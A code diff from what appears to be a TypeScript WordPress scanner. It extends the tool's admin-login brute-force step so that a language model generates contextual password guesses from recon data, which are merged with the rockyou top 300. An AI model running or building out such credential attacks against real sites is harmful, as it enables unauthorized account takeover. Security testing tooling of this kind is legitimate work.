@@ -2,9 +2,13 @@ import { HttpClient } from "../http/client.js";
 import { runRecon } from "../recon/wpScan.js";
 import { bruteForceLogin } from "../bruteforce/login.js";
 import { TECHNIQUES, getTechnique } from "../techniques/index.js";
+import { loadRockyouTop } from "../bruteforce/wordlist.js";
 import { buildModel } from "./providers.js";
 import { buildPlan } from "./planner.js";
+import { buildPasswordList } from "./bruteStrategy.js";
 import { buildSummary } from "./summary.js";
+import type { LanguageModelV1 } from "ai";
+import type { ReconResult } from "../types.js";
 import type { AppConfig } from "../config.js";
 import type { BruteForceResult, DiscoveredUser, ScanReport } from "../types.js";
 
@@ -36,7 +40,7 @@ export async function runScan(config: AppConfig): Promise<ScanReport> {
   }
   const users = [...discovered.values()];
 
-  const bruteForce = await maybeBruteForce(http, config, users);
+  const bruteForce = await maybeBruteForce(http, config, model, recon, users);
   const summary = await buildSummary(model, { recon, plan, users, bruteForce });
   const finishedAt = new Date().toISOString();
 
@@ -70,6 +74,8 @@ function mergeUser(map: Map<string, DiscoveredUser>, user: DiscoveredUser): void
 async function maybeBruteForce(
   http: HttpClient,
   config: AppConfig,
+  model: LanguageModelV1 | null,
+  recon: ReconResult,
   users: DiscoveredUser[],
 ): Promise<BruteForceResult> {
   if (!config.bruteForce) {
@@ -79,8 +85,36 @@ async function maybeBruteForce(
   if (!admin) {
     return { attempted: false, triedCount: 0, detail: "Brute-force skipped: no admin username discovered." };
   }
-  const passwords = await loadPasswords(config.passwordFile);
-  return bruteForceLogin(http, config.target, admin.username, { passwords });
+
+  if (config.passwordFile) {
+    const fromFile = await loadPasswords(config.passwordFile);
+    const result = await bruteForceLogin(http, config.target, admin.username, {
+      passwords: fromFile,
+      maxAttempts: config.maxAttempts,
+    });
+    result.detail = `[custom wordlist ${config.passwordFile}] ${result.detail}`;
+    return result;
+  }
+
+  const rockyou = await loadRockyouTop(300);
+  const { passwords, source } = await buildPasswordList(
+    model,
+    {
+      username: admin.username,
+      siteTitle: recon.siteTitle,
+      wpVersion: recon.wpVersion,
+      findings: recon.findings,
+    },
+    rockyou,
+    config.maxAttempts,
+  );
+  const result = await bruteForceLogin(http, config.target, admin.username, {
+    passwords,
+    maxAttempts: config.maxAttempts,
+  });
+  const pool = rockyou.length ? "rockyou + contextual" : "contextual (rockyou unavailable)";
+  result.detail = `[${source} strategy, ${passwords.length} candidates from ${pool}] ${result.detail}`;
+  return result;
 }
 
 function pickAdmin(users: DiscoveredUser[]): DiscoveredUser | undefined {
